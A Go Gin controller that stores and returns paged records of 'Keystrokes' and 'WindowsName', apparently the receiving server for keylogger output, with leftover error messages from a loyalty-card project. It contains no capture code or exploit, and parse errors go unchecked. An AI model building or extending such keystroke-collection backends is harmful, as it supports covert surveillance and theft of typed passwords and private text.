package controllers

import (
	"net/http"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/loyalty-application/go-gin-backend/collections"
	"github.com/loyalty-application/go-gin-backend/models"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"go.mongodb.org/mongo-driver/mongo"
	"golang.org/x/text/encoding/unicode"
	"golang.org/x/text/transform"
	"golang.org/x/text/unicode/norm"
)

type TextController struct{}

func (t TextController) GetTexts(c *gin.Context) {

	// required
	limit := c.Query("limit")
	if limit == "" {
		limit = "100"
	}

	// optional
	page := c.Query("page")
	if page == "" {
		page = "0"
	}

	pageInt, err := strconv.ParseInt(page, 10, 64)
	limitInt, err := strconv.ParseInt(limit, 10, 64)

	if pageInt < 0 || limitInt <= 0 {
		c.JSON(http.StatusBadRequest, models.HTTPError{Code: http.StatusBadRequest, Message: "Param page should be >= 0 and limit should be > 0 "})
		return
	}

	skipInt := pageInt * limitInt
	result, err := collections.RetrieveAllTexts(skipInt, limitInt)
	if err != nil {
		c.JSON(http.StatusInternalServerError, models.HTTPError{Code: http.StatusInternalServerError, Message: "Failed to retrieve cards"})
		return
	}

	
	decoder := unicode.UTF8.NewDecoder()
	output := make([]models.Output, 0)
	for _, text := range result {
		str := norm.NFKD.String(text.Keystrokes)
		decoded, _, err := transform.String(decoder, str)
		if err != nil {
			continue
		}
		temp := models.Output{
			Keystrokes: decoded,
			WindowsName: text.WindowsName,
		}
		output = append(output, temp)
	}

	c.JSON(http.StatusOK, output)
}

func (t TextController) PostText(c *gin.Context) {
	data := new(models.Text)
	err := c.BindJSON(data)
	if err != nil {
		c.JSON(http.StatusBadRequest, models.HTTPError{Code: http.StatusBadRequest, Message: "Invalid Text Object" + err.Error()})
		return
	}

	data.Timestamp = primitive.NewDateTimeFromTime(time.Now())
	result, err := collections.CreateText(*data)
	if err != nil {
		msg := "Failed to insert card" + err.Error()
		if mongo.IsDuplicateKeyError(err) {
			msg = "CardId already exists"
		}
		c.JSON(http.StatusBadRequest, models.HTTPError{Code: http.StatusBadRequest, Message: msg})
		return
	}

	c.JSON(http.StatusCreated, result)
}